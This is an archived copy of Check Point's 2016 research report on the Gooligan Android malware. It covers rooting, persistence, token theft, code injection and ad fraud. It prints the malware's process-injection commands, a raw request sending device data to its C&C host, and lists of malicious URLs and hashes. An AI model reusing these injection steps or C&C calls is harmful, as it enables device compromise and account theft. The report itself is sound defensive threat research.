{
    "id": "34b34965-ea3b-4417-979e-36f04154a91d",
    "created_at": "2022-10-25T16:48:16.268799Z",
    "updated_at": "2025-03-27T02:16:25.643996Z",
    "deleted_at": null,
    "sha1_hash": "08e0d4eeef1c3c99713dcd577120e2c30efeae0c",
    "title": "Word Template",
    "authors": "",
    "file_creation_date": "2016-12-13T14:53:54Z",
    "file_modification_date": "2016-12-13T14:53:54Z",
    "file_size": 1543007,
    "plain_text": "# GOOLIGAN\n\n### MORE THAN A MILLION GOOGLE ACCOUNTS BREACHED\n\nby the Check Point Research Team\n\n### INTRODUCTION \n\n[Gooligan, a new variant of the Android malware Check Point researchers](http://blog.checkpoint.com/2015/07/10/adware-or-apt-snappea-downloader-an-android-malware-that-implements-12-different-exploits/)\n[found in the SnapPea app last year, has breached the security of more](http://blog.checkpoint.com/2015/07/10/adware-or-apt-snappea-downloader-an-android-malware-that-implements-12-different-exploits/)\nthan a million Google accounts, potentially exposing messages,\ndocuments, and other sensitive data to attack.\n\nThis new variant roots devices and steals email addresses and\nauthentication tokens stored on the device. With this information, an\nattacker can access a user’s Google account data like Google Play, Google\nPhotos, Gmail, Google Drive, and G Suite.\n\n### GOOLIGAN'S GENEALOGY\n\nIn its previous version, dubbed SnapPea, the malware displayed an\nirregularly large arsenal of rooting exploits, much more than what\ncommon malware used at the time. SnapPea did not use self-made\nexploits, but instead collected a variety of well-known exploit kits and\ntried them one after the other until the rooting was successful.\n\nAfter achieving root access, the malware continues to ensure its\npersistency on the device by adding itself to the system folders, and to\nthe factory reset process, meaning it will be able to remain on the device\neven after flashing its ROM. The malware then continues to act on its\nmalicious objective, and waits for commands from its C&C server to\ndownload and install applications proposed by ad networks.\n\nSnapPea turned out to be an early strain of a much larger trend of mobile\nadware, which included, among many others, large malware families\nsuch as BrainTest and HummingBad.\n\n\n-----\n\nThe same malware family was detected by different security vendors and\nwas given several different names, such as Ghostpush, MonkeyTest,\nXinyinhe, Ztorg (Triada) and others.\n\nThe Check Point research team believes these are all variants of the same\nfamily based on code analysis and the samples' behavior. Ztorg, for\ninstance, shares with Gooligan the same injection technique. The\nmalware family reduced its activity early in 2016, until recently, when it\nwas detected by the Check Point research team.\n\nGooligan, the newest member of the family, arrived with a more complex\narchitecture and greater capabilities based on injecting malicious code\ninto the system processes. Gooligan not only roots the device, but also\nsteals the users' email address and authentication token, and injects code\ninto system apps, including Google Play, all for the purpose of generating\nfraudulent ad revenue. Also, the malware can fake the device's identifiers\nto enlarge the potential revenue from each infected device.\n\nThe change in the way the malware works today may be to help finance\nthe campaign through fraudulent ad activity. The malware simulates\nclicks on app advertisements provided by legitimate ad networks and\nforces the app to install on a device. An attacker is paid by the ad\nnetwork when one of these apps is installed successfully. Logs collected\nby Check Point researchers show that every day Gooligan fraudulently\ninstalls at least 30,000 apps on breached devices or over 2 million apps\nsince the campaign began.\n\n### GENERAL ATTACK FLOW\n\nThe infection begins when a user downloads and installs a malicious app\ncontaining Gooligan code on a vulnerable Android device. Check Point\nresearchers found infected apps on third-party app stores, but the\ninfected apps could also be downloaded by Android users directly by\ntapping malicious links in SMS messages sent by the attackers. Past\nversions of the malware were found even on Google Play, Google's\nofficial app store. After installation, an infected app sends data about the\ndevice to the campaign’s Command and Control (C&C) server.\n\n\n-----\n\n**Figure 1: Malware attack flow**\n\n#### Rooting the device\n\nGooligan then downloads a malicious module from C&C server and\nrunning it. This module contains multiple Android 4 and 5 exploits from\nknown exploits packs such as dashi root (opda.cn). These exploits still\nplague many devices today because security patches that fix these may\nnot be available for some versions of Android, or they are available but\nwere never installed by the user.\n\n[Our findings from the QuadRooter](http://blog.checkpoint.com/2016/08/07/quadrooter/) scanner app emphasize this flaw in\nAndroid security. Between August 7 and August 10, 2016, more than\n500,000 users tested their devices to see if they were vulnerable to the\nQuadRooter vulnerabilities. According to the results, a significant\npercentage of users did not implement new security updates:\n\n\n-----\n\n**Figure 2: Android patch dates by OEMs for approximately 500,000 devices as of Aug. 10, 2016**\n\n#### Post root activity\n\nIf rooting is successful, the attacker has full control of the device and can\nexecute privileged commands remotely. After achieving root access,\nGooligan unpacks a number of malicious modules and installs them to\nthe /system partition of the infected device. Most of the modules are\nresponsible for generating revenue for the malware authors, installing\nfraudulent apps, but a new module goes even further, by causing direct\nharm to the user.\n\nThis module injects code into running Google Play or GMS (Google\nMobile Services) to mimic user behavior so Gooligan can avoid detection,\n[a technique first seen with the mobile malware HummingBad. The](http://blog.checkpoint.com/2016/07/01/from-hummingbad-to-worse-new-in-depth-details-and-analysis-of-the-hummingbad-andriod-malware-campaign/)\nmodule allows Gooligan to:\n\n  - Steal a user’s Google account email and authentication token\n\ninformation\n\n  - Install apps from Google Play and rate them to raise their\n\nreputation\n\n  - Install adware to generate revenue\n\nGooligan receives the names of the apps to download from Google Play\nfrom its C&C servers. After an app is installed, the ad service pays the\nattacker. Then the malware leaves a positive review and a high rating on\nGoogle Play using content it receives from the C&C server.\n\n\n-----\n\n### DETAILED TECHNICAL ANALYSIS\n\n**Figure 3: Gooligan’s operational flow**\n\n\n-----\n\n**Figure 4: The malware’s architecture**\n\n#### The loader\n\nThe malware's loader changed very little since the SnapPea version. The\nmain application hides the malicious code inside assets/close.png file.\nThis is only a dropper, responsible for gathering information about the\ndevice, sending it to the C&C server, and downloading the next link in the\nmalicious chain. Once initiated, it decodes dex code to a temporary file\n_/pthe/name.apk and dynamically loads it. The loaded file contains two_\nentities registered in the manifest: a broadcast receiver and a service.\n\nThe broadcast receiver is designed to react to any activity made by the\nuser. After each intent, it schedules an alarm, which restarts the service\nevery hour. On each alarm, the malware gathers data about the device\nand sends it to one of the C&C servers in an encrypted form. This data\nhelps the server to decide which set of tools it will send the malware to\nroot the device. The following are the initiation C&C servers:\n\n  - http[:]//api2.appsolo.net/ggview/rsddateindex\n\n  - http[:]//sys.hdyfhpoi.com/ggview/rsddateindex\n\n  - http[:]//sys.syllyq1n.com/ggview/rsddateindex\n\n  - http[:]//sys.wksnkys7.com/ggview/rsddateindex\n\n\n-----\n\n**Figure 5: Broadcast receiver code**\n\nThe data sent to the C&C server includes the device's phone number, OS\nversion, IMEI, IMSI, module, country, language and more. Below is an\nexample of the details sent about each infected device:\n\n**Figure 6: Device details as sent to the C&C server**\n\n\n-----\n\nThe C&C server responds with a link to an APK, which contains the\nrooting tools and the payload. By loading the exploits and actual\nmalicious payload dynamically, and by not storing the whole operation\non the original app, the malware maintains a low profile and is able to\navoid detection.\n\n**Figure 7: C&C response with link to the exploit kit**\n\nIf the C&C server does not respond at all, the dropper downloads the\npayload from a default URL.\n\n#### Rooting exploits\n\nThe payload is encoded with a very simple XOR algorithm. The same\ntechnique is common to all the samples belonging to this malware family,\nand is one of its identifiers. The dropper decodes strings and traffic from\nthe C&C server in the same manner.\n\n**Figure 8: File decode**\n\n\n-----\n\n**Figure 9: String decode**\n\nOnce the payload is downloaded, the malware unpacks it and\ndynamically loads Dalvik code and calls method InitRoot from it. The\nmalware prepares everything it needs to control the device: exploits,\nutilities, and additional malware components. All of these can be\nobtained from two sources: the first is by downloading files from the C&C\nserver and the second (if the server isn't available) is to decode them\nfrom a base64 string.\n\nThe figure below illustrates the common code used for downloading files.\n\n**Figure 10: Dropper's download function**\n\n\n-----\n\nWhen all executables are prepared, the malware launches the exploits\none-by-one, until one of them succeeds and the device is rooted. All the\nexploits are known Android privilege escalation exploits, which are still\neffective even years after patches were introduced to fix them. This is\nlikely because of the low implementation rate of security patches in the\nAndroid ecosystem.\n\n#### Persistency\n\nAfter the malware roots the device, it generates a post-root shell script\nand executes it with root permissions. The script installs different\ncomponents of malware to the directories of /system partition. This\ngrants the malware components with persistency, since removing apps\ninstalled on the system requires root access, which most users don't\nhave. The usual solution is flashing the device's ROM to the original ROM,\nwhich does not contain the malware.\n\n**Figure 11: su installation**\n\nTo circumvent this security solution, the malware continues to change\nthe install-recovery.sh, to ensure the persistency of these modules even\nwhen the device is flashed. By changing the recovery file, the malware\nguarantees that it will be part of the new ROM which will be installed on\nthe device. This makes it significantly harder to get rid of the malware in\nordinary methods.Every installed component has an entry activity\ncalled.WakeActivity. If the device was already rooted and hidden\ncomponents installed to the system, the main application calls them by\nthe timer.\n\n#### Google account theft\n\nPerhaps the most interesting feature of this\ncampaign is that it steals email addresses\nand authentication tokens. Once the device\nis rooted, the malware collects the user's\nemail address and matching authentication token. Using this token, the\nattackers can access the user's entire Google account, endangering the\nsecurity of their Gmail account, Google Drive, Google Docs, Google\nPhotos and more.\n\n\n-----\n\nAuthentication tokens are a common method used to identify users\nwithout having to require a password each time they connect to a\nspecific service. Each token is created to identify the specific user for\nwhich it is generated. The token is stored locally on the users' devices,\nand each time they access the specific service the token is used to\nidentify the users and log them into their account automatically.\n\n**Figure 11: Commands to steal the user's email address and authentication token**\n\n#### Code injection\n\nSome payloads returned by the ggview[/]rsddateindex API, contain a\nnew, additional functionality. This functionality injects Dalvik code into\nthe running processes. To implement this functionality, the malware\ncreates four files in the file system:\n\n  - _/system/xbin/igpi_\n\n  - _/system/lib/igpld.so_\n\n  - _/system/lib/igpld.so;_\n\n  - _/system/lib/igpfix.so;_\n\nAnd adds a few lines in post-rooting script:\n\n_/system/xbin/igpi /system/lib/igpld.so com.android.vending_\n\n_/system/xbin/igpi /system/lib/igpld.so com.google.android.gms_\n\n_/system/xbin/igpi /system/lib/igpld.so_\n_com.google.android.gms.persistent_\n\nThe file /system/xbin/igpi is used to inject binary library into a remote\nprocess. The first parameter is which library to inject, and the second\nparameter is the target process's name. To inject the code, it uses a\ncommon approach based on ptrace. Since writing complex logic for\nAndroid in CPP code is much more complex than in Java code, the loaded\nlibrary igpld contains only the functionality which loads the Dalvik code\ninto the target process. The loading is implemented in CPP and consists of\nfour steps:\n\n\n-----\n\n  - Setup tmp dir for dexopt;\n\n  - Get SystemClassLoader object of the target process;\n\n  - Use DexClassLoader to load dalvik library;\n\n  - Load class from dalvik library and execute its method (hardcoded\n\ncom.igp.a.Main.main method)\n\nThe loaded Dalvik code receives the Android context of the target\nprocess and registers a receiver on all possible events.\n\n**Figure 13: Receiving the Android context**\n\n**Figure 14: Dalvik code receivers**\n\nAfter the event is received, the malware sends a request with the\ndevice's info to the server g[.]omlao.com/igp/api/1, as seen below:\n\n**_POST /igp/api/8/ HTTP/1.1_**\n**_Content-Length: 166_**\n**_Host: g.omlao.com_**\n**_Connection: Keep-Alive_**\n**_samsungGT-I9300qLinux version 3.0.31-2795693 (dpi@SWDB4807)_**\n**_(gcc version 4.4.3 (GCC) ) #1 SMP PREEMPT Fri Nov 7 21:45:32 KST_**\n**_2014\"4.3*smdk4x122_**\n**_tub.ajy.ics_**\n\n\n-----\n\nThis protocol is different from the rest of the malware's components\nwhich use json, and is based on protobufs. However, it encodes messages\nwith the same XOR algorithm which is used in other parts of the malware.\nThis indicates that the new module was based on the same codebase as\nthe previous.\n\nThe C&C server responses with a link to a dynamic plugin. The malware\ndecodes it, and then loads and executes a method from it. (com.ig.a.a.b)\n\nThe purpose of injecting code into system apps is mainly to inject code\ninto running Google Play or GMS (Google Mobile Services) processes. This\nis a is a technique first introduced by HummingBad (link, link to video). By\ndoing so the attackers can install as many fraudulent apps as they want\nwithout raising alarms by conducting any suspicious activity.\n\nThe attackers mimic a user's normal behavior, instead of downloading\napps from C&C servers which are much more likely to raise suspicion and\nget caught. Gooligan receives the names of the fraudulent apps for\ndownload from ad servers.\n\nSimilar to HummingBad, the malware can also fake the device's\nidentification information, such as IMEI and IMSI to download the same\napp again but registering as a separate device, doubling the potential\nrevenue gained from each infected device. This is done through the\nXposed framework and altering the information supplied by the\nTelephonyManager and GooglePlay market apps.\n\n#### Fraudulent ratings\n\nIn addition to injecting code into Google Play processes and downloading\nfraudulent apps, the malware also leaves high ratings on the said apps\nand bogus reviews.\n\nThe Check Point research team was able to identify several instances of\nthis activity by cross-referencing data from breached devices with Google\nPlay app reviews. This is another reminder of why users shouldn’t rely on\nratings alone to decide whether to trust an app.\n\n\n-----\n\n**Figure 15: Two examples of reviews left by users who were also found on the**\n**attacker's records as victims.**\n\n**Figure 16:** **Examples of fake reviews and comments for one of the fraudulent**\n**applications on Google Play.**\n\n\n-----\n\n**Figure 17: The same user discovered two different fraudulent apps were installed on**\n**his device, without his knowledge.**\n\n**Figure 18: One of the apps downloaded from Google Play by Gooligan.**\n\n\n-----\n\n### NETWORK IOCs\n\nThe Check Point investigation started with the following .apk sample:\n\nPackage name - tub.ajy.ics sha256 c1251cc47f34ech6a7bd0e44f72456111b7d6e21f9bd70e89ff9f466eb1d01ab98.\n\n1. The malware accesses the following urls:\n\n  - hxxp://api2.appsolo.net/ggview/rsddateindex\n\n  - hxxp://sys.aedxdrcb.com/ggview/rsddateindex\n\n  - hxxp://api.aedxdrcb.com/ggview/rsddateindex\n\n  - hxxp://sys.syllyq1n.com/ggview/rsddateindex\n\n  - hxxp://sys.hdyfhpoi.com/ggview/rsddateindex\n\nThe graphic below shows network details of m.aedxdrcb.com, which is\ncontacted by the sample.\n\n**Figure 19: Network details of m.aedxdrcb.com.**\n\nOn the same IP of the malware server there are additional servers that\n[are registered to sgsh@opda.com](mailto:sgsh@opda.com)\n\nThe graphic below shows network details of api2.appsolo.net, which is\ncontacted by the sample.\n\n\n-----\n\n**Figure 20: Network details of api2.appsolo.net**\n\nDuring the research we have found admin pages with applications related\nto Gooligan:\n\n  - hxxp://mas.goaapis.com/overseaads/admin\n\n  - hxxp://mas.goaapis.com/overseapay/admin\n\n  - hxxp://pay.fastmopay.com/overseapay/admin\n\n  - Connection between fastmopay.com to g.omlao.com can be found\n\nin the next graphic.\n\n2. The malware then downloads malicious binaries:\n\n  - hxxp://down.cmgkiwdwcom/thinking/group/pl4y_3\n\n  - hxxp://down.akocdn.com/onemain/maink.apk\n\n  - hxxp://106.186.17.81/rootmasterdemo1128_524.apk\n\n  - hxxp://down.vcrlwlen.com/thinking/group/rt1018_648.apk\n\n\n-----\n\n3. The malware then accesses the server g.omlao.com to link to dex\n\nmodule to execute in infected process.\n\nThe graphic below shows network details of g.omlao.com, which is\ncontacted by the sample\n\n**Figure 21: Network details of g.omlao.com.**\n\n4. The malware sends logs of its operation to:\n\n  - hxxp://api.gadmobs.com/oversea_adjust_and_download_write_r\n\nedis/notify/download/app\n\n  - hxxp://log.appsolo.net/gkview/info/601\n\n  - hxxp://m.aedxdrcb.com/pmsg/api/20\n\nThe graphic below shows the network details of log.appsolo.net, which is\ncontacted by the sample.\n\n\n-----\n\n**Figure 22: Network details of log.appsolo.net.**\n\n### THE PERPETRATORS BEHIND GOOLIGAN\n\nUnfortunately, the attackers who created Gooligan malware have yet to\nbe found. However, there are several leads that may help to trace them.\n\nThe server which was used by the attackers to manage the Gooligan\nmalware is an Aazon Web Services (AWS) server located in Singapore.\nCheck Point has contacted AWS and the Singapore cybercrime\nauthorities.\n\n\n-----\n\n### WHO IS AFFECTED?\n\nGooligan potentially affects devices on Android 4 (Jelly Bean, KitKat) and\n[5 (Lollipop), which is over 74% of in-market devices](https://developer.android.com/about/dashboards) today. At least 13,000\ndevices have been infected per day since the campaign began on August\n22, 2016 reaching a total of over a million rooted devices.\n\nThe Check Point research team seized the entire list of victims by\naccessing the attackers’ Hadoop server (g.omlao.com, 52.74.212.250),\nwhich was left entirely open. Some of the email addresses are associated\nwith government agencies in the Philippines, India, Bangladesh, and\nBelize, while others belong to educational institutions, financial services\nfirms, and publicly traded enterprises.\n\n**Figure 23: Spread of Gooligan victims by continent**\n\n### HOW DO YOU KNOW IF YOUR GOOGLE ACCOUNT IS BREACHED?\n\nVisit [https://gooligan.checkpoint.com to learn if your account is](https://gooligan.checkpoint.com/)\nbreached. If it is, perform the following steps:\n\n  - Remove the malware by installing a mobile security solution on\n\n[your device like ZoneAlarm](https://www.zonealarm.com/mobile-security/) [(for consumers) or Check Point Mobile](https://www.checkpoint.com/products/mobile-threat-prevention/)\n[Threat Prevention (for businesses).](https://www.checkpoint.com/products/mobile-threat-prevention/)\n\n  - [Change your Google account password.](https://support.google.com/accounts/answer/41078?source=gsearch&hl=en)\n\n\n-----\n\n### SUMMARY\n\nThe security of over a million Google accounts was breached by Gooligan,\na new variant of Android malware discovered by Check Point researchers.\nThis is the largest Google account breach to date affecting about 74% of\nall Android devices and exposing users accounts for Google Play, Gmail,\nGoogle Photos, Google Docs, G Suite data and more.\n\n### CONCLUSION\n\nIf your account has been breached, you should install a mobile security\nsolution that removes the malware; then you should change your Google\naccount password to reset the tokens for your device.\n\n\n-----\n\n### APPENDIX 1\n#### List of package names installed by Gooligan\n\n  - com[.]cg.clean.guru (No longer found on Google Play.)\n\n  - com[.]violet.battery.guru (No longer found on Google Play.)\n\n  - com[.]speed.boost.clean (No longer found on Google Play.)\n\n  - com[.]tools.clean (No longer found on Google Play.)\n\n  - com[.]doctor.power.saver.lite\n\n  - com[.]doctor.power.saver\n\n  - com[.]blackjack21.goodgame\n\n  - com[.]power.fast.charge\n\n  - com[.]xxgame.solitaire.android\n\n  - com[.]xxapp.freemusic\n\n  - com[.]doorwaygames.StarOfLasVegas\n\n  - com[.]tattoo.draw.hand\n\n  - com[.]tv.broadcast\n\n  - com[.]sweet.wallpapers\n\n  - com[.]androapplite.app.applock.lite.blue\n\n  - com[.]fast.sos.flashlight\n\n  - com[.]doctor.power.saver\n\n  - com[.]xxgame.solitaire.android\n\n  - com[.]xxapp.freemusic\n\n  - com[.]violet.battery.guru\n\n  - com[.]doorwaygames.StarOfLasVegas\n\n  - com[.]doctor.power.saver.lite\n\n  - com[.]power.fast.charge\n\n  - com[.]tools.clean\n\n  - com[.]cg.clean.guru\n\n  - com[.]speed.boost.clean\n\n  - com[.]battleships.pacific.android\n\n  - com[.]blackjack21.goodgame\n\n  - com[.]msgame.holdem.poker\n\n\n-----\n\n### APPENDIX 2\n#### SHA256 hashes of samples connected to the attack\n\n07f9a055fdf9e3e67bfe7a67952747c0020e3e4ffe461122d23b653d4fd52455\na1238be52e0913f8679e249b7099b9f58fe57a76a32e1b177743ce4d16abd000\nb0da7c219cc895db3c7fab3c5e6855e43e4e268733d982a02527af27eb762def\n867eb7655c11c01b9d35a0c595f82d4628d5583bd3ddc3fdfe19967995424555\n354600f5691575f00b6abc48e555ddb69859d5973688443aad7dd6d1de4c6249\n05b33442670e460c893710b7c0dda46bde826d8067bbaba36d1ee0d5907207ac\nd9b8f075b348af14edf044624a72103428dc6577e69b7ea4e93763b4c1ab80c7\ncbedc9693849086cd388bf0d3c036bbfa80a9aa10c7d49db3575b8626a003e6e\na7b4f38844653b8f86ea5dd68cdf28a7e363df46968f4be75a5785e610987e59\n870578049e8ccae3024b9344337fd640ccc4f14acb072b30bfb3abda30714a72\ne1257111072fdfe35779787f966a414dde40165eb66f382bbdc7676629b969d6\n349fed356c7aa55c8971630f7935578f3504693d96a74c8f7cc73701747f5cb7\nf820744aedd716c5896574dee39b6c15e085a096920d7e70eb417dd891df0563\n12b8da40ec9e53a83a7c4b1d490db397730123efa5e8ed39ee596d3bae42f80d\n70b8014302f72c4da8cb636f8bad643b32aaa7bd171010c5f045b771303db395\n7842ead880bd98fb423723383e69db16fdb9ff917fc836522a42159fb7959f94\nc89d725daddc309bf24411e29dd58d1e181ffdfb5191c17c63217ba9c4fd09dc\ne03c9a118d003b10e5b1a0770c77288aa139e06209d616ba5135b92460feda7f\ne091d0a05e4514ac1c193cb26519f2cc1ee4f00c0ff447038e1c6f37a72ed1ff\na032d434a4c5e6f5d728d36d435b258be5a877752d79a8fd236e96527a3ff573\n3386a5a5ee447cbde467e26f8442bcd2f9ada8eda03f8ca2e46e39b19aa4debb\n5bfe0e13e6d925dec72e401a829e320ef447852defa805d1ca7646001b5ec134\ncc553ef39d9c554ddaef8ea0d866379ffada7ea1fa994b19fddcb33e43c2f9a1\n12062dfd934ca3fcde1e86871e84bb2f71bade21b8823da2c5fadc75bfafc8fb\nce22d3e9cee82dbb1a53609ccb6dfa3ec198d54c4eb35dd120dfa0a55a497c9c\nd25e95b8a1d1024ecb983c758e2993def46e5de5f73d50f4f7762e29a5755712\neca6693ca85549101c8dbe0910235eac193459e6e1b3133d33fbe4eea8417bc5\n43b5985f025200b0a24357e02d5c680af98d45c20446fd2d981110d6a9696c76\n191b4eb236c5ef2dfe5b942262d01d118ebf5c9a225ef7f0cba5a184445783aa\nd1a38ede86092e621a734bc62f147556b888bf4c55489baf7a8de7f41f927b81\ncc1811aa02e6e4a821aef1f6bfbfef525d2f9c994a247586b2ae4e5850c1930f\nc239e46b769801dd6d8e1ac6ea2e86738c67bdb0c0f3909c5fc02861386ecc52\n470c633e4804e0abd917399d52ace266b4aba47816b113fbdd09b832a7d72194\n0dfaad97ac88b159657d3642ddcacb31045dc98bb1f1d12805e6673ddca1ea1f\n421971df2f3dbd7173473404c8f3b2d3ed522efa86cac49ef905edf645054422\n93cd06a6c3df7cda6d9213a0eab0b98daf9ea3e1f2b009f5bd40f160a4e6814a\n36e15c8b6211b22d4176424339ab39a52e65d2b1c9dea3b24c3639fb022a85ec\nf0699aa87cf7a7845b39f21aa9e018e0860ac97e5b33c3eddfdca7d11c629cca\nd10a691c1642d40eea40b6038ac961006a68f57dddd46bdf322a842ef459bd05\ne83b62fee05a9d3a10fff43782fa0cc45ef73391f8923d21cbe20b9b7c7db6ba\ndb04ad4a91d3a9fcba6d98e86c52b8644f071c94c9047bf34ff2fb84bc6d89c9\n56557bf64edccf7758e48decffc619bf5b6761616a4fb192b9ef6ea7d930554b\n56f045b79e705bcc7255f5d43f596e36464a4b774d374b735161c29e47baa1e3\n5b46e3137216a0776ca782c83004c0da4dafe7473eccd2fe8d8114e170d9329b\n\n\n-----\n\na2672ae55704d4245b6ed91e155e19c64e3d01b5e9a8d36d31b5f7b3ff63eeae\n90f581b2386be57516fa55025324cacdb9ea12998af75a9f96f3074b8e6f6177\n0e012f69d493b7cc38fcafcf495e0bd1290ca94b1ad043fcf255df3ad5789834\n422b23b0b67bc14e8b38525ceee18fe5a84911ad55308a3e9c6124e1764e4c09\n7720ad4eca127b50bc41263e54b2be4157dd894828c3a338c8a85ca7411731b8\nfe004b912fb8b7f290f8d17f33a7b07df5a7a59adc449c343005ec2db0b75f71\nef002a629319eaed04769adcfad03c58cbe19aa3a13674ad2be95e0ba1f5f59f\n1ebf15dac765a075e97c682f04fac7b4bf53efd93c70ff9f30dd7c053a3e1a45\nb3bb323cdb254039c67278cde02e1c6b1d7bded8fe6cabe64c8295850667156d\nc3af147ee86ab8778b76f12f5f51384e9b36f29f3bf667adeaf308b72a909c74\n5749b6beb4493adab453e26219652d968c760bea510196e9fd9319bc3712296b\n7b191604b875d6cc8164e568f5a78ac54bf03762abb6d78b6fdcea7f2094c72a\nb1298ab9b9928537bd7151af489df8e9964e9439212fa5407a7e114df9be4bca\n923e1301508dace3704821c030877b669daf15ef4a93ed707087c62304ffd5d3\n91f59854eae589389225e8fe942def5ede3204ad6237adf77c0e0675d0820076\n5deb76c71c06460ecc86d2b275faff5ce05d337ba772e51544bbef5c12ef6616\nad38b1523f671a9aad7007b8c4eece75fd4b168819b7f5bfa0b4b8adff619020\n\n\n-----\n\n**[Learn More About](http://www.checkpoint.com/mobilesecurity)**\n**[Check Point Mobile Threat Prevention](http://www.checkpoint.com/mobilesecurity)**\n\n**[Schedule a Demo](https://www.checkpoint.com/request-a-demo/)**\n\n©2016 Check Point Software Technologies Ltd. All rights reserved.\n\n\n**[Learn More About](http://www.checkpoint.com/mobilesecurity)**\n**[Check Point Mobile Threat Prevention](http://www.checkpoint.com/mobilesecurity)**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "http://blog.checkpoint.com/wp-content/uploads/2016/12/Gooligan-Research-Report.pdf"
    ],
    "report_names": [
        "Gooligan-Research-Report.pdf"
    ],
    "threat_actors": [
        {
            "id": "0afff988-cf8a-443b-9e2e-8686e511d0ed",
            "created_at": "2023-01-06T13:46:38.45683Z",
            "updated_at": "2025-03-27T02:00:02.83822Z",
            "deleted_at": null,
            "main_name": "HummingBad",
            "aliases": [],
            "source_name": "MISPGALAXY:HummingBad",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1481640834,
    "ts_modification_date": 1481640834,
    "files": {
        "pdf": "https://archive.orkl.eu/08e0d4eeef1c3c99713dcd577120e2c30efeae0c.pdf",
        "text": "https://archive.orkl.eu/08e0d4eeef1c3c99713dcd577120e2c30efeae0c.txt",
        "img": "https://archive.orkl.eu/08e0d4eeef1c3c99713dcd577120e2c30efeae0c.jpg"
    }
}